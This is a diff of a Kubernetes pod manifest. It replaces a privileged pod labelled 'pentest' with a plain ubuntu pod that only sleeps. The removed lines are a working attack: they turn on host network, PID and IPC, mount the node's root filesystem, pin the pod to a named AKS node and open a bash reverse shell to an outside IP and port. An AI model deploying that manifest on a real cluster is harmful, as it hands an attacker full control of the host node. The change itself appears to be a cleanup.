@@ -22,25 +22,12 @@ spec:
 apiVersion: v1
 kind: Pod
 metadata:
-  name: everything allowed reverse shell pod
-  labels:
-    app: pentest
+  name: ubuntu
+  namespace: development
 spec:
-  hostNetwork: true
-  hostPID: true
-  hostIPC: true
   containers:
-  -  name: reverse shell
-  image: ubuntu
-  command: ["/bin/bash", "-c", "--"]
-  args: ["bash -i >& /dev/tcp/4.242.16.43/7777 0>&1"]
-  securityContext:
-    privileged: true
-  volumeMounts:
-    - mountPath: /host
-      name: noderoot
-  nodename: aks-userpool-01500227-vmss000001
-  volumes:
-    - name: noderoot
-      hostPath:
-        path: /
+    - name: ubuntu
+      image: ubuntu
+      command:
+        - sleep
+        - infinity
